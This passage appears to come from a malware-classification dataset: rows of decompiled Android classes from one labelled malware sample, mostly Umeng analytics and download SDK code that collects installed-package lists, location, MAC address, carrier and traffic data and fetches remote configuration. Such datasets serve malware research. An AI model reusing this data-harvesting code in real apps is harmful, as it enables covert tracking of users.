sharedPreferences){     if (location == null || location.getTime() <= sharedPreferences.getLong(g,0L)) {       return false;     }     sharedPreferences.edit().putLong(g,location.getTime()).commit();     return true;   }   @Override public void b(  JSONObject jSONObject) throws Exception {     jSONObject.put(d,this.a);     jSONObject.put(e,this.b);     jSONObject.put(f,this.c);   }   @Override public void a(  JSONObject jSONObject) throws JSONException {     if (jSONObject != null) {       if (jSONObject.has(d)) {         this.a=jSONObject.getDouble(d);       }       if (jSONObject.has(e)) {         this.b=jSONObject.getDouble(e);       }       if (jSONObject.has(f)) {         this.c=jSONObject.getLong(f);       }     }   }   @Override public boolean a(){     return (this.a == 0.0d && this.b == 0.0d && this.c == 0) ? false : true;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.analytics.a\p.code","public class p implements g {   private static final String c=""uptr"";   private static final String d=""dntr"";   public long a=0;   public long b=0;   @Override public void a(  JSONObject jSONObject) throws Exception {     if (jSONObject != null) {       if (jSONObject.has(c)) {         this.a=jSONObject.getLong(c);       }       if (jSONObject.has(d)) {         this.b=jSONObject.getLong(d);       }     }   }   @Override public void b(  JSONObject jSONObject) throws Exception {     if (this.a > 0) {       jSONObject.put(c,this.a);     }     if (this.b > 0) {       jSONObject.put(d,this.b);     }   }   @Override public boolean a(){     return this.a > 0 && this.b > 0;   }   public static p a(  Context context){     try {       p pVar=new p();       long[] b=b(context);       if (b[0] <= 0 || b[1] <= 0) {         return null;       }       SharedPreferences e=com.umeng.analytics.j.e(context);       long j=e.getLong(c,-1L);       long j2=e.getLong(d,-1L);       e.edit().putLong(c,b[1]).putLong(d,b[0]).commit();       if (j <= 0 || j2 <= 0) {         return null;       }       b[0]=b[0] - j2;       b[1]=b[1] - j;       if (b[0] <= 0 || b[1] <= 0) {         return null;       }       pVar.b=b[0];       pVar.a=b[1];       return pVar;     }  catch (    Exception e2) {       Log.e(com.umeng.analytics.g.q,""sdk less than 2.2 has get no traffic"");       return null;     }   }   private static long[] b(  Context context) throws Exception {     Class<?> cls=Class.forName(""android.net.TrafficStats"");     Method method=cls.getMethod(""getUidRxBytes"",Integer.TYPE);     Method method2=cls.getMethod(""getUidTxBytes"",Integer.TYPE);     int i=context.getApplicationInfo().uid;     if (i == -1) {       return null;     }     return new long[]{((Long)method.invoke(null,Integer.valueOf(i))).longValue(),((Long)method2.invoke(null,Integer.valueOf(i))).longValue()};   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.analytics.onlineconfig\a.code","public class a {   private final String a=""last_config_time"";   private final String b=""report_policy"";   private final String c=""online_config"";   private String d=null;   private String e=null;   private UmengOnlineConfigureListener f=null;   private c g=null;   public void a(  Context context){     try {       if (context == null) {         Log.b(g.q,""unexpected null context in updateOnlineConfig"");       }  else {         new Thread(new b(context)).start();       }     }  catch (    Exception e) {       Log.b(g.q,""exception in updateOnlineConfig"");     }   }   public void a(  Context context,  String str,  String str2){     this.d=str;     this.e=str2;     a(context);   }   public void a(  UmengOnlineConfigureListener umengOnlineConfigureListener){     this.f=umengOnlineConfigureListener;   }   public void a(){     this.f=null;   }   public void a(  c cVar){     this.g=cVar;   }   public void b(){     this.g=null;   }   public void a(  JSONObject jSONObject){     if (this.f != null) {       this.f.onDataReceived(jSONObject);     }   }   private String b(  Context context) throws Exception {     String str=this.d;     if (str == null) {       str=com.umeng.common.b.q(context);     }     if (str == null) {       throw new Exception(""none appkey exception"");     }     return str;   }   private String c(  Context context){     return this.e == null ? com.umeng.common.b.u(context) : this.e;   }   public JSONObject d(  Context context){     JSONObject jSONObject=new JSONObject();     try {       getClass();       jSONObject.put(com.umeng.common.a.c,""online_config"");       jSONObject.put(com.umeng.common.a.h,b(context));       jSONObject.put(com.umeng.common.a.g,com.umeng.common.b.d(context));       jSONObject.put(com.umeng.common.a.d,com.umeng.common.b.v(context));       jSONObject.put(com.umeng.common.a.i,g.c);       jSONObject.put(com.umeng.common.a.f,h.b(com.umeng.common.b.g(context)));       jSONObject.put(com.umeng.common.a.e,c(context));       jSONObject.put(""report_policy"",j.i(context)[0]);       jSONObject.put(""last_config_time"",e(context));       return jSONObject;     }  catch (    Exception e) {       Log.b(g.q,""exception in onlineConfigInternal"");       return null;     }   }   private String e(  Context context){     return j.b(context).getString(g.C,"""");   }   public void a(  Context context,  com.umeng.analytics.onlineconfig.b bVar){     SharedPreferences.Editor edit=j.b(context).edit();     if (!TextUtils.isEmpty(bVar.e)) {       edit.putString(g.C,bVar.e);     }     if (bVar.c != -1) {       edit.putInt(g.A,bVar.c);       edit.putLong(g.B,bVar.d);     }     edit.commit();   }   public void b(  Context context,  com.umeng.analytics.onlineconfig.b bVar){     if (bVar.a != null && bVar.a.length() != 0) {       SharedPreferences.Editor edit=j.b(context).edit();       try {         JSONObject jSONObject=bVar.a;         Iterator<String> keys=jSONObject.keys();         while (keys.hasNext()) {           String next=keys.next();           edit.putString(next,jSONObject.getString(next));         }         edit.commit();         Log.a(g.q,""get online setting params: "" + jSONObject);       }  catch (      Exception e) {         Log.c(g.q,""save online config params"",e);       }     }   } public class b extends s implements Runnable {     Context a;     public b(    Context context){       this.a=context.getApplicationContext();     }     @Override public void run(){       try {         b();       }  catch (      Exception e) {         a.this.a((JSONObject)null);         Log.c(g.q,""reques update error"",e);       }     }     @Override public boolean a(){       return false;     }     private void b(){       C0001a c0001a=new C0001a(a.this.d(this.a));       com.umeng.analytics.onlineconfig.b bVar=null;       for (      String str : g.s) {         c0001a.a(str);         bVar=(com.umeng.analytics.onlineconfig.b)a(c0001a,com.umeng.analytics.onlineconfig.b.class);         if (bVar != null) {           break;         }       }       if (bVar == null) {         a.this.a((JSONObject)null);         return;       }       Log.a(g.q,""response : "" + bVar.b);       if (bVar.b) {         if (a.this.g != null) {           a.this.g.a(bVar.c,bVar.d);         }         a.this.a(this.a,bVar);         a.this.b(this.a,bVar);         a.this.a(bVar.a);         return;       }       a.this.a((JSONObject)null);     }   } public class C0001a extends t {     private JSONObject e;     public C0001a(    JSONObject jSONObject){       super(null);       this.e=jSONObject;     }     @Override public JSONObject a(){       return this.e;     }     @Override public String b(){       return this.d;     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.analytics.onlineconfig\b.code","public class b extends s implements Runnable {   Context a;   public b(  Context context){     this.a=context.getApplicationContext();   }   @Override public void run(){     try {       b();     }  catch (    Exception e) {       a.this.a((JSONObject)null);       Log.c(g.q,""reques update error"",e);     }   }   @Override public boolean a(){     return false;   }   private void b(){     C0001a c0001a=new C0001a(a.this.d(this.a));     com.umeng.analytics.onlineconfig.b bVar=null;     for (    String str : g.s) {       c0001a.a(str);       bVar=(com.umeng.analytics.onlineconfig.b)a(c0001a,com.umeng.analytics.onlineconfig.b.class);       if (bVar != null) {         break;       }     }     if (bVar == null) {       a.this.a((JSONObject)null);       return;     }     Log.a(g.q,""response : "" + bVar.b);     if (bVar.b) {       if (a.this.g != null) {         a.this.g.a(bVar.c,bVar.d);       }       a.this.a(this.a,bVar);       a.this.b(this.a,bVar);       a.this.a(bVar.a);       return;     }     a.this.a((JSONObject)null);   } } public class b extends u {   public JSONObject a;   boolean b;   int c;   int d;   String e;   private final String f;   private final String g;   private final String h;   private final String i;   private final String j;   public b(  JSONObject jSONObject){     super(jSONObject);     this.a=null;     this.b=false;     this.c=-1;     this.d=-1;     this.f=""config_update"";     this.g=""report_policy"";     this.h=""online_params"";     this.i=""last_config_time"";     this.j=g.G;     if (jSONObject != null) {       a(jSONObject);       a();     }   }   private void a(  JSONObject jSONObject){     try {       if (jSONObject.has(""config_update"") && !jSONObject.getString(""config_update"").toLowerCase().equals(""no"")) {         if (jSONObject.has(""report_policy"")) {           this.c=jSONObject.getInt(""report_policy"");           this.d=jSONObject.optInt(g.G) * 1000;           this.e=jSONObject.optString(""last_config_time"");         }  else {           Log.e(g.q,"" online config fetch no report policy"");         }         this.a=jSONObject.optJSONObject(""online_params"");         this.b=true;       }     }  catch (    Exception e) {       Log.e(g.q,""fail to parce online config response"",e);     }   }   private void a(){     if (this.c < 0 || this.c > 6) {       this.c=1;     }     if (this.c == 6 && this.d <= 0) {       this.d=g.h;     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.analytics.onlineconfig\c.code","public interface c {   void a(  int i,  long j); } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.analytics.onlineconfig\C0001a.code","public class C0001a extends t {   private JSONObject e;   public C0001a(  JSONObject jSONObject){     super(null);     this.e=jSONObject;   }   @Override public JSONObject a(){     return this.e;   }   @Override public String b(){     return this.d;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.analytics.onlineconfig\UmengOnlineConfigureListener.code","public interface UmengOnlineConfigureListener {   void onDataReceived(  JSONObject jSONObject); } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common\a.code","public class a {   public static final String a=""/download/.um"";   public static final String b=""/umdownload"";   public static final String c=""type"";   public static final String d=""package"";   public static final String e=""channel"";   public static final String f=""idmd5"";   public static final String g=""version_code"";   public static final String h=""appkey"";   public static final String i=""sdk_version"";   public static final String j=""proto_ver"";   public static final String k=""old_md5"";   public static final String l=""delta"";   public static String m=null; } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common\b.code","public class b {   protected static final String a=b.class.getName();   protected static final String b=""Unknown"";   public static final int c=8;   private static final String d=""2G/3G"";   private static final String e=""Wi-Fi"";   public static boolean a(  String str,  Context context){     try {       context.getPackageManager().getPackageInfo(str,1);       return true;     }  catch (    PackageManager.NameNotFoundException e2) {       return false;     }   }   public static boolean a(  Context context){     return context.getResources().getConfiguration().locale.toString().equals(Locale.CHINA.toString());   }   public static Set<String> b(  Context context){     int i=0;     HashSet hashSet=new HashSet();     List<PackageInfo> installedPackages=context.getPackageManager().getInstalledPackages(0);     while (true) {       int i2=i;       if (i2 < installedPackages.size()) {         hashSet.add(installedPackages.get(i2).packageName);         i=i2 + 1;       }  else {         return hashSet;       }     }   }   public static boolean c(  Context context){     return context.getResources().getConfiguration().orientation == 1;   }   public static String d(  Context context){     try {       return String.valueOf(context.getPackageManager().getPackageInfo(context.getPackageName(),0).versionCode);     }  catch (    PackageManager.NameNotFoundException e2) {       return b;     }   }   public static String e(  Context context){     try {       return context.getPackageManager().getPackageInfo(context.getPackageName(),0).versionName;     }  catch (    PackageManager.NameNotFoundException e2) {       return b;     }   }   public static boolean a(  Context context,  String str){     return context.getPackageManager().checkPermission(str,context.getPackageName()) == 0;   }   public static String f(  Context context){     ApplicationInfo applicationInfo;     PackageManager packageManager=context.getPackageManager();     try {       applicationInfo=packageManager.getApplicationInfo(context.getPackageName(),0);     }  catch (    PackageManager.NameNotFoundException e2) {       applicationInfo=null;     }     return (String)(applicationInfo != null ? packageManager.getApplicationLabel(applicationInfo) : """");   }   public static String[] a(  GL10 gl10){     try {       return new String[]{gl10.glGetString(7936),gl10.glGetString(7937)};     }  catch (    Exception e2) {       Log.b(a,""Could not read gpu infor:"",e2);       return new String[0];     }   }   public static java.lang.String a(){     throw new UnsupportedOperationException(""Method not decompiled: com.umeng.common.b.a():java.lang.String"");   }   public static java.lang.String g(  android.content.Context r4){     throw new UnsupportedOperationException(""Method not decompiled: com.umeng.common.b.g(android.content.Context):java.lang.String"");   }   public static String h(  Context context){     return h.b(g(context));   }   public static String i(  Context context){     try {       TelephonyManager telephonyManager=(TelephonyManager)context.getSystemService(""phone"");       if (telephonyManager == null) {         return b;       }       return telephonyManager.getNetworkOperatorName();     }  catch (    Exception e2) {       e2.printStackTrace();       return b;     }   }   public static String j(  Context context){     try {       DisplayMetrics displayMetrics=new DisplayMetrics();       ((WindowManager)context.getSystemService(""window"")).getDefaultDisplay().getMetrics(displayMetrics);       return String.valueOf(displayMetrics.heightPixels) + ""*"" + String.valueOf(displayMetrics.widthPixels);     }  catch (    Exception e2) {       e2.printStackTrace();       return b;     }   }   public static java.lang.String[] k(  android.content.Context r4){     throw new UnsupportedOperationException(""Method not decompiled: com.umeng.common.b.k(android.content.Context):java.lang.String[]"");   }   public static boolean l(  Context context){     return e.equals(k(context)[0]);   }   public static Location m(  Context context){     Location location;     Location lastKnownLocation;     try {       LocationManager locationManager=(LocationManager)context.getSystemService(""location"");       if (a(context,""android.permission.ACCESS_FINE_LOCATION"") && (lastKnownLocation=locationManager.getLastKnownLocation(""gps"")) != null) {         Log.c(a,""get location from gps:"" + lastKnownLocation.getLatitude() + "",""+ lastKnownLocation.getLongitude());         location=lastKnownLocation;       }  else       if (a(context,""android.permission.ACCESS_COARSE_LOCATION"") && (location=locationManager.getLastKnownLocation(""network"")) != null) {         Log.c(a,""get location from network:"" + location.getLatitude() + "",""+ location.getLongitude());       }  else {         Log.c(a,""Could not get location from GPS or Cell-id, lack ACCESS_COARSE_LOCATION or ACCESS_COARSE_LOCATION permission?"");         location=null;       }       return location;     }  catch (    Exception e2) {       Log.b(a,e2.getMessage());       return null;     }   }   public static boolean n(  Context context){     try {       NetworkInfo activeNetworkInfo=((ConnectivityManager)context.getSystemService(""connectivity"")).getActiveNetworkInfo();       if (activeNetworkInfo != null) {         return activeNetworkInfo.isConnectedOrConnecting();       }       return false;     }  catch (    Exception e2) {       return true;     }   }   public static boolean b(){     return Environment.getExternalStorageState().equals(""mounted"");   }   public static int o(  Context context){     try {       Calendar calendar=Calendar.getInstance(y(context));       if (calendar != null) {         return calendar.getTimeZone().getRawOffset() / 3600000;       }     }  catch (    Exception e2) {       Log.a(a,""error in getTimeZone"",e2);     }     return 8;   }   public static String[] p(  Context context){     String[] strArr=new String[2];     try {       Locale y=y(context);       if (y != null) {         strArr[0]=y.getCountry();         strArr[1]=y.getLanguage();       }       if (TextUtils.isEmpty(strArr[0])) {         strArr[0]=b;       }       if (TextUtils.isEmpty(strArr[1])) {         strArr[1]=b;       }     }  catch (    Exception e2) {       Log.b(a,""error in getLocaleInfo"",e2);     }     return strArr;   }   private static Locale y(  Context context){     Locale locale=null;     try {       Configuration configuration=new Configuration();       Settings.System.getConfiguration(context.getContentResolver(),configuration);       if (configuration != null) {         locale=configuration.locale;       }     }  catch (    Exception e2) {       Log.b(a,""fail to read user config locale"");     }     if (locale == null) {       return Locale.getDefault();     }     return locale;   }   public static String q(  Context context){     try {       ApplicationInfo applicationInfo=context.getPackageManager().getApplicationInfo(context.getPackageName(),g.c);       if (applicationInfo != null) {         String string=applicationInfo.metaData.getString(""UMENG_APPKEY"");         if (string != null) {           return string.trim();         }         Log.b(a,""Could not read UMENG_APPKEY meta-data from AndroidManifest.xml."");       }     }  catch (    Exception e2) {       Log.b(a,""Could not read UMENG_APPKEY meta-data from AndroidManifest.xml."",e2);     }     return null;   }   public static String r(  Context context){     WifiManager wifiManager;     try {       wifiManager=(WifiManager)context.getSystemService(""wifi"");     }  catch (    Exception e2) {       Log.e(a,""Could not get mac address."" + e2.toString());     }     if (a(context,""android.permission.ACCESS_WIFI_STATE"")) {       return wifiManager.getConnectionInfo().getMacAddress();     }     Log.e(a,""Could not get mac address.[no permission android.permission.ACCESS_WIFI_STATE"");     return """";   }   public static String s(  Context context){     int i;     int i2;     try {       DisplayMetrics displayMetrics=new DisplayMetrics();       ((WindowManager)context.getSystemService(""window"")).getDefaultDisplay().getMetrics(displayMetrics);       if ((context.getApplicationInfo().flags & 8192) == 0) {         i2=a(displayMetrics,""noncompatWidthPixels"");         i=a(displayMetrics,""noncompatHeightPixels"");       }  else {         i=-1;         i2=-1;       }       if (i2 == -1 || i == -1) {         i2=displayMetrics.widthPixels;         i=displayMetrics.heightPixels;       }       StringBuffer stringBuffer=new StringBuffer();       stringBuffer.append(i2);       stringBuffer.append(""*"");       stringBuffer.append(i);       return stringBuffer.toString();     }  catch (    Exception e2) {       Log.b(a,""read resolution fail"",e2);       return b;     }   }   private static int a(  Object obj,  String str){     try {       Field declaredField=DisplayMetrics.class.getDeclaredField(str);       declaredField.setAccessible(true);       return declaredField.getInt(obj);     }  catch (    Exception e2) {       e2.printStackTrace();       return -1;     }   }   public static String t(  Context context){     try {       return ((TelephonyManager)context.getSystemService(""phone"")).getNetworkOperatorName();     }  catch (    Exception e2) {       Log.a(a,""read carrier fail"",e2);       return b;     }   }   public static String a(  Date date){     return new SimpleDateFormat(""yyyy-MM-dd HH:mm:ss"").format(date);   }   public static String c(){     return new SimpleDateFormat(""yyyy-MM-dd"").format(new Date());   }   public static Date a(  String str){     try {       return new SimpleDateFormat(""yyyy-MM-dd HH:mm:ss"").parse(str);     }  catch (    Exception e2) {       return null;     }   }   public static int a(  Date date,  Date date2){     if (!date.after(date2)) {       date2=date;       date=date2;     }     return (int)((date.getTime() - date2.getTime()) / 1000);   }   public static String u(  Context context){     Object obj;     try {       ApplicationInfo applicationInfo=context.getPackageManager().getApplicationInfo(context.getPackageName(),g.c);       if (applicationInfo != null && applicationInfo.metaData != null && (obj=applicationInfo.metaData.get(""UMENG_CHANNEL"")) != null) {         String obj2=obj.toString();         if (obj2 == null) {           Log.a(a,""Could not read UMENG_CHANNEL meta-data from AndroidManifest.xml."");         }  else {           return obj2;         }       }     }  catch (    Exception e2) {       Log.a(a,""Could not read UMENG_CHANNEL meta-data from AndroidManifest.xml."");       e2.printStackTrace();     }     return b;   }   public static String v(  Context context){     return context.getPackageName();   }   public static String w(  Context context){     return context.getPackageManager().getApplicationLabel(context.getApplicationInfo()).toString();   }   public static boolean x(  Context context){     try {       return (context.getApplicationInfo().flags & 2) != 0;     }  catch (    Exception e2) {       return false;     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common\Log.code","public class Log {   public static boolean LOG=false;   public static void a(  String str,  String str2){     if (LOG) {       android.util.Log.i(str,str2);     }   }   public static void a(  String str,  String str2,  Exception exc){     if (LOG) {       android.util.Log.i(str,exc.toString() + "":  ["" + str2+ ""]"");     }   }   public static void b(  String str,  String str2){     if (LOG) {       android.util.Log.e(str,str2);     }   }   public static void b(  String str,  String str2,  Exception exc){     if (LOG) {       android.util.Log.e(str,exc.toString() + "":  ["" + str2+ ""]"");       for (      StackTraceElement stackTraceElement : exc.getStackTrace()) {         android.util.Log.e(str,""        at\t "" + stackTraceElement.toString());       }     }   }   public static void c(  String str,  String str2){     if (LOG) {       android.util.Log.d(str,str2);     }   }   public static void c(  String str,  String str2,  Exception exc){     if (LOG) {       android.util.Log.d(str,exc.toString() + "":  ["" + str2+ ""]"");     }   }   public static void d(  String str,  String str2){     if (LOG) {       android.util.Log.v(str,str2);     }   }   public static void d(  String str,  String str2,  Exception exc){     if (LOG) {       android.util.Log.v(str,exc.toString() + "":  ["" + str2+ ""]"");     }   }   public static void e(  String str,  String str2){     if (LOG) {       android.util.Log.w(str,str2);     }   }   public static void e(  String str,  String str2,  Exception exc){     if (LOG) {       android.util.Log.w(str,exc.toString() + "":  ["" + str2+ ""]"");       for (      StackTraceElement stackTraceElement : exc.getStackTrace()) {         android.util.Log.w(str,""        at\t "" + stackTraceElement.toString());       }     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common\Res.code","public class Res {   private static final String a=Res.class.getName();   private static Res b=null;   private static String c=null;   private static Class d=null;   private static Class e=null;   private static Class f=null;   private static Class g=null;   private static Class h=null;   private static Class i=null;   private static Class j=null;   private Res(  String str){     try {       e=Class.forName(str + "".R$drawable"");     }  catch (    ClassNotFoundException e2) {       Log.b(a,e2.getMessage());     }     try {       f=Class.forName(str + "".R$layout"");     }  catch (    ClassNotFoundException e3) {       Log.b(a,e3.getMessage());     }     try {       d=Class.forName(str + "".R$id"");     }  catch (    ClassNotFoundException e4) {       Log.b(a,e4.getMessage());     }     try {       g=Class.forName(str + "".R$anim"");     }  catch (    ClassNotFoundException e5) {       Log.b(a,e5.getMessage());     }     try {       h=Class.forName(str + "".R$style"");     }  catch (    ClassNotFoundException e6) {       Log.b(a,e6.getMessage());     }     try {       i=Class.forName(str + "".R$string"");     }  catch (    ClassNotFoundException e7) {       Log.b(a,e7.getMessage());     }     try {       j=Class.forName(str + "".R$array"");     }  catch (    ClassNotFoundException e8) {       Log.b(a,e8.getMessage());     }   }   public static synchronized Res getInstance(  Context context){     Res res; synchronized (Res.class) {       if (b == null) {         c=c != null ? c : context.getPackageName();         b=new Res(c);       }       res=b;     }     return res;   }   public static void setPackageName(  String str){     c=str;   }   public int a(  String str){     return a(g,str);   }   public int b(  String str){     return a(d,str);   }   public int c(  String str){     return a(e,str);   }   public int d(  String str){     return a(f,str);   }   public int e(  String str){     return a(h,str);   }   public int f(  String str){     return a(i,str);   }   public int g(  String str){     return a(j,str);   }   private int a(  Class<?> cls,  String str){     if (cls == null) {       Log.b(a,""getRes(null,"" + str + "")"");       throw new IllegalArgumentException(""ResClass is not initialized. Please make sure you have added neccessary resources. Also make sure you have "" + c + "".R$* configured in obfuscation. field=""+ str);     }     try {       return cls.getField(str).getInt(str);     }  catch (    Exception e2) {       Log.b(a,""getRes("" + cls.getName() + "", ""+ str+ "")"");       Log.b(a,""Error getting resource. Make sure you have copied all resources (res/) from SDK to your project. "");       Log.b(a,e2.getMessage());       return -1;     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common.a\a.code","public class a {   public static int a(  Context context){     return Res.getInstance(context).b(""umeng_common_progress_text"");   }   public static int b(  Context context){     return Res.getInstance(context).b(""umeng_common_icon_view"");   }   public static int c(  Context context){     return Res.getInstance(context).b(""umeng_common_progress_bar"");   }   public static int d(  Context context){     return Res.getInstance(context).b(""umeng_common_title"");   }   public static int e(  Context context){     return Res.getInstance(context).b(""umeng_common_rich_notification_continue"");   }   public static int f(  Context context){     return Res.getInstance(context).b(""umeng_common_rich_notification_pause"");   }   public static int g(  Context context){     return Res.getInstance(context).b(""umeng_common_rich_notification_cancel"");   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common.a\b.code","public class b {   public static int a(  Context context){     return Res.getInstance(context).d(""umeng_common_download_notification"");   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common.a\c.code","public class c {   public static int a(  Context context){     return Res.getInstance(context).f(""umeng_common_network_break_alert"");   }   public static int b(  Context context){     return Res.getInstance(context).f(""umeng_common_action_info_exist"");   }   public static int c(  Context context){     return Res.getInstance(context).f(""umeng_common_info_interrupt"");   }   public static int d(  Context context){     return Res.getInstance(context).f(""umeng_common_action_pause"");   }   public static int e(  Context context){     return Res.getInstance(context).f(""umeng_common_action_continue"");   }   public static int f(  Context context){     return Res.getInstance(context).f(""umeng_common_action_cancel"");   }   public static int g(  Context context){     return Res.getInstance(context).f(""umeng_common_download_notification_prefix"");   }   public static int h(  Context context){     return Res.getInstance(context).f(""umeng_common_pause_notification_prefix"");   }   public static int i(  Context context){     return Res.getInstance(context).f(""umeng_common_download_failed"");   }   public static int j(  Context context){     return Res.getInstance(context).f(""umeng_common_start_download_notification"");   }   public static int k(  Context context){     return Res.getInstance(context).f(""umeng_common_download_finish"");   }   public static int l(  Context context){     return Res.getInstance(context).f(""umeng_common_patch_finish"");   }   public static int m(  Context context){     return Res.getInstance(context).f(""umeng_common_silent_download_finish"");   }   public static int n(  Context context){     return Res.getInstance(context).f(""umeng_common_start_patch_notification"");   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common.net\a.code","!org.eclipse.jdt.core.dom.TypeDeclaration@39f7e75aclass a extends SQLiteOpenHelper {   private static final int b=2;   private static final String c=""CREATE TABLE umeng_download_task_list (cp TEXT, url TEXT, progress INTEGER, extra TEXT, last_modified TEXT, UNIQUE (cp,url) ON CONFLICT ABORT);"";   a(  Context context){     super(context,c.c,(SQLiteDatabase.CursorFactory)null,2);   }   @Override public void onCreate(  SQLiteDatabase sQLiteDatabase){     Log.c(c.a,c);     sQLiteDatabase.execSQL(c);   }   @Override public void onUpgrade(  SQLiteDatabase sQLiteDatabase,  int i,  int i2){   } } public static class a extends com.umeng.common.util.j {   public a(  Context context){     super(context);   }   public a a(  RemoteViews remoteViews){     this.b.contentView=remoteViews;     return this;   }   public a a(  CharSequence charSequence){     if (Build.VERSION.SDK_INT >= 14) {       this.c.setContentText(charSequence);     }     this.b.contentView.setTextViewText(com.umeng.common.a.a.a(this.a),charSequence);     return this;   }   public a b(  CharSequence charSequence){     if (Build.VERSION.SDK_INT >= 14) {       this.c.setContentTitle(charSequence);     }     this.b.contentView.setTextViewText(com.umeng.common.a.a.d(this.a),charSequence);     return this;   }   public a a(  int i,  int i2,  boolean z){     if (Build.VERSION.SDK_INT >= 14) {       this.c.setProgress(i,i2,z);     }     this.b.contentView.setProgressBar(com.umeng.common.a.a.c(this.a),100,i2,false);     return this;   }   public a a(){     this.b.contentView.setViewVisibility(com.umeng.common.a.a.e(this.a),8);     this.b.contentView.setViewVisibility(com.umeng.common.a.a.g(this.a),8);     return this;   }   public a a(  PendingIntent pendingIntent,  PendingIntent pendingIntent2){     this.b.contentView.setOnClickPendingIntent(com.umeng.common.a.a.e(this.a),pendingIntent);     this.b.contentView.setViewVisibility(com.umeng.common.a.a.e(this.a),0);     this.b.contentView.setViewVisibility(com.umeng.common.a.a.g(this.a),0);     this.b.contentView.setOnClickPendingIntent(com.umeng.common.a.a.g(this.a),pendingIntent2);     return this;   }   public a b(){     int e=com.umeng.common.a.a.e(this.a);     this.b.contentView.setTextViewText(e,this.a.getResources().getString(com.umeng.common.a.c.e(this.a.getApplicationContext())));     this.b.contentView.setInt(e,""setBackgroundResource"",Res.getInstance(this.a).c(""umeng_common_gradient_green""));     return this;   }   public a c(){     int e=com.umeng.common.a.a.e(this.a);     this.b.contentView.setTextViewText(e,this.a.getResources().getString(com.umeng.common.a.c.d(this.a.getApplicationContext())));     this.b.contentView.setInt(e,""setBackgroundResource"",Res.getInstance(this.a).c(""umeng_common_gradient_orange""));     return this;   }   public Notification d(){     if (Build.VERSION.SDK_INT >= 16) {       return this.c.build();     }     if (Build.VERSION.SDK_INT >= 14) {       return this.c.getNotification();     }     return this.b;   }   public void a(  int i,  String str,  PendingIntent pendingIntent){     if (Build.VERSION.SDK_INT >= 16) {       this.c.addAction(i,str,pendingIntent);     }   } } public interface a {   void a(  int i);   void a(  int i,  int i2);   void a(  int i,  Exception exc);   void a(  int i,  String str); } public interface a {   void a();   void a(  p.a aVar); } public interface a {   void a(  p.a aVar);   void a(  b bVar); } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common.net\b.code","!org.eclipse.jdt.core.dom.TypeDeclaration@2e183a50class b implements ServiceConnection {   final a a;   public b(  a aVar){     this.a=aVar;   }   @Override public void onServiceConnected(  ComponentName componentName,  IBinder iBinder){     String str;     String str2;     String str3;     String str4;     String str5;     String[] strArr;     boolean z;     boolean z2;     boolean z3;     Messenger messenger;     Log.c(a.b,""ServiceConnection.onServiceConnected"");     this.a.e=new Messenger(iBinder);     try {       Message obtain=Message.obtain((Handler)null,4);       str=this.a.f;       str2=this.a.g;       str3=this.a.h;       a.C0002a c0002a=new a.C0002a(str,str2,str3);       str4=this.a.i;       c0002a.d=str4;       str5=this.a.j;       c0002a.e=str5;       strArr=this.a.k;       c0002a.f=strArr;       z=this.a.l;       c0002a.g=z;       z2=this.a.m;       c0002a.h=z2;       z3=this.a.n;       c0002a.i=z3;       obtain.setData(c0002a.a());       obtain.replyTo=this.a.a;       messenger=this.a.e;       messenger.send(obtain);     }  catch (    RemoteException e) {     }   }   @Override public void onServiceDisconnected(  ComponentName componentName){     Log.c(a.b,""ServiceConnection.onServiceDisconnected"");     this.a.e=null;   } } private static class b {   public static final c a=new c();   private b(){   } } public static class b {   DownloadingService.b a;   a b;   int c;   int d;   a.C0002a e;   long[] f=new long[3];   public b(  a.C0002a c0002a,  int i){     this.c=i;     this.e=c0002a;   }   public void a(  SparseArray<b> sparseArray){     sparseArray.put(this.c,this);   }   public void b(  SparseArray<b> sparseArray){     if (sparseArray.indexOfKey(this.c) >= 0) {       sparseArray.remove(this.c);     }   } } public class b extends Thread {   private Context b;   private boolean c;   private File d;   private int e;   private long f;   private long g;   private int h=-1;   private int i;   private a j;   private a.C0002a k;   public b(  Context context,  a.C0002a c0002a,  int i,  int i2,  a aVar){     long[] jArr;     this.e=0;     this.f=-1L;     this.g=-1L;     try {       this.b=context;       this.k=c0002a;       this.e=i2;       if (DownloadingService.F.indexOfKey(i) >= 0 && (jArr=((d.b)DownloadingService.F.get(i)).f) != null && jArr.length > 1) {         this.f=jArr[0];         this.g=jArr[1];       }       this.j=aVar;       this.i=i;       boolean[] zArr=new boolean[1];       this.d=q.a(""/apk"",context,zArr);       this.c=zArr[0];       q.a(this.d,this.c ? DownloadingService.w : DownloadingService.x,DownloadingService.y);       this.d=new File(this.d,a(this.k));     }  catch (    Exception e) {       